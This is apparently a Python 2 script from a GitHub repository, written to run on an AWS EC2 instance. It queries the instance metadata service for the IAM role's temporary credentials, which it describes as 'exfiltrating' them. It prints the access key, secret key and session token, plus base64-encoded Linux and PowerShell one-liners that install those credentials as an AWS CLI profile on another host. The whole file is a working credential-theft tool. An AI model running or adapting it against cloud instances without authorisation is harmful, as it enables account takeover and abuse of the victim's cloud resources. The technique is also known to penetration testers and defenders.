import requests 
import json
import base64
#Made by Lizzie Moratti 
#This script is intended to be ran from an EC2 instance using Amazon Linux 2. It can be adapted for other purposes.
#By default (as of time of writing 11/25/2022), AL2 has python 2.7 supported and already has the requests library imported.

#Run this script with the oneliner provided in the readme for this github repo. 
#This script will return the credentials to the terminal and give you a one-liner to use on 

def requestsWrapper( url, headers,HTTPmethod='GET'):
    if(HTTPmethod == 'PUT'):
        response = requests.put(url, headers=headers).text
        return response
    response= requests.get(url, headers=headers).text
    return response
try:
    print("\n ********************************************************************** \n")
    print("Attempting to exfiltrate EC2 instance role credentials.")
    print("   Attempting to PUT request to metadata endpoint to obtain token for subsequent requests.")
    token = requestsWrapper('http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': '21600',},'PUT')
    print("        [SUCCESS]")
    print("   Enumerating role name for the EC2 instance profile.")
    ec2role = requestsWrapper('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': '%s' % token,})
    print("        [SUCCESS]")
    print("   Making final request for credentials")
    credentials = requestsWrapper('http://169.254.169.254/latest/meta-data/iam/security-credentials/%s/' % ec2role, {'X-aws-ec2-metadata-token': '%s' % token,})
    print("        [SUCCESS]")
except Exception as e:
    print("Error: " + e.args)
    print("Something has gone wrong.")
#We need  
jsonCredentials = json.loads(credentials)
print("\n\nThese credentials expire after 6 hours. You can copy and paste this blob into ~/.aws/credentials to quickly make a profile from your host machine.\n")
echoFriendlyProfileName = "[%s]" % ec2role
echoFriendlyAccessKeyId = "aws_access_key_id = " + jsonCredentials["AccessKeyId"]
echoFriendlySecretAccessKey = "aws_secret_access_key = " + jsonCredentials["SecretAccessKey"]
echoFriendlySessionToken = "aws_session_token = " + jsonCredentials["Token"]
print(echoFriendlyProfileName)
print(echoFriendlyAccessKeyId)
print(echoFriendlySecretAccessKey)
print(echoFriendlySessionToken)
#print we're gonna make a command to copy and paste to add the profile to your ~/.aws/credentials file
echo = "\n%s\n%s\n%s\n%s" % (echoFriendlyProfileName,echoFriendlyAccessKeyId,echoFriendlySecretAccessKey,echoFriendlySessionToken) 
echo = base64.b64encode(echo.encode("ascii"))
print("\n**One-liners to use on a different host to add this key as an AWS CLI profile **")
print("\n LINUX ONE-LINER:")
print( "\n" + "echo -e " + "\"" + echo + "\"" + " | base64 -d >> ~/.aws/credentials ") 
print("\n POWERSHELL ONE-LINER:")
#same oneliner but for PowerShell
print("\n$ENCODED = \""+ echo +"\";$DECODED=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ENCODED));Add-Content $env:USERPROFILE\.aws\credentials $DECODED;$ENCODED=\"\";$DECODED=\"\";")

print("Run this AWS CLI command to see if your profile works and if the name of the credentials is accurate.")
print( "\naws --profile " + ec2role + " sts get-caller-identity\n\n")